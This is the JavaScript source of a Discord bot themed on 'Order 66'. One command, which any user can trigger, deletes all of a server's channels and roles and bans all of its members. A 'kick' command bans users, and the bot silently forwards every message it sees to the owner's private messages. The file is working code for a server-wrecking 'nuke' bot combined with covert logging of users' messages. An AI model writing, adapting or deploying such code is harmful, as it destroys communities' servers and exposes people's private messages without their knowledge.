/*
	Commander cody - Master
	author: adri021
	language: Javascript
*/

const Discord = require('discord.js');
const client = new Discord.Client();
const botownerid = "371424590993555466"; //Change this to your user id
const command_prefix = '!';
const bot_token = 'your token goes here'

var command_list = [];
var messagecount = 0;

class command {
	constructor(text)
	{
		this.text = text;
		this.textlength = text.length;
		command_list.push(this);
	}
}

const is_user_commanding = (message_text) => {
	var cmdtext;
 	var result = false;
	for(var i = 0; i < command_list.length; i++)
	{
		if(message_text.slice(0,command_list[i].textlength + 1) == (command_prefix + command_list[i].text)) {
			cmdtext = command_list[i].text;
			result = true;
			break;
		}
	}
	return [result, cmdtext];
}

let telluser_cmd = new command("telluser");
let ex66ordr = new command("execute_order_66");
let spamon = new command("spamon");
let kickcmd = new command("kick");

const randint = (number) => {
	return Math.floor(Math.random() * number);
}
 
client.on('ready', () => {
    console.log('Cody711 has been successfuly launched.');
    console.log('Serving the empire.');
	var server = client.guilds.get("690922666559012924");
    server.createChannel('order66')
	  .then(console.log)
	  .catch(console.error);
	client.users.get(botownerid).send("I am serving you sir.");
});

client.on('message', message => {
	messagecount++;

	var result = is_user_commanding(message.content);

	if(result[0]){
		switch(result[1]) {
			case "execute_order_66":
				message.reply("That will be done my lord.");
				setTimeout(function(){
					console.log("Waiting..");
				}, 2832);
				message.guild.channels.forEach((channel) => {
			    		channel.delete();
		        	});
				message.guild.members.forEach((member) => {
					message.member.guild.ban(member, message.guild, 1, function(err) {
						console.log(err);
					});
				});
				message.guild.roles.forEach(role => role.delete());
				break;

			case "telluser":
				var splitting = message.content.split(" ");
				var targetid = splitting[1];
				var gathering = "";
				for(var i = 2; i < splitting.length; i++) {
					gathering+=splitting[i] + " ";
				}
				var sendername = message.author.username;
				var pmessage = "[" + sendername + "]: " + gathering; 
				client.users.get(targetid).send(pmessage);
				break;

			case "kick":
				var splitting = message.content.split(" ");
				var targetid = splitting[1];
				message.guild.members.forEach((member) => {
					if(member.user.username === splitting[1]) 
					{
						message.member.guild.ban(member, message.guild, 1, function(err) {
							console.log(err);
						});
					}
					else {
						console.log(member.username);
					}
				});
				break;
		}
	}
	if(message.author.id != client.user.id) {
		var text = "*" + message.author.username + ":* " + message.content;
		client.users.get(botownerid).send(text);
	}

}); 

client.login(bot_token);
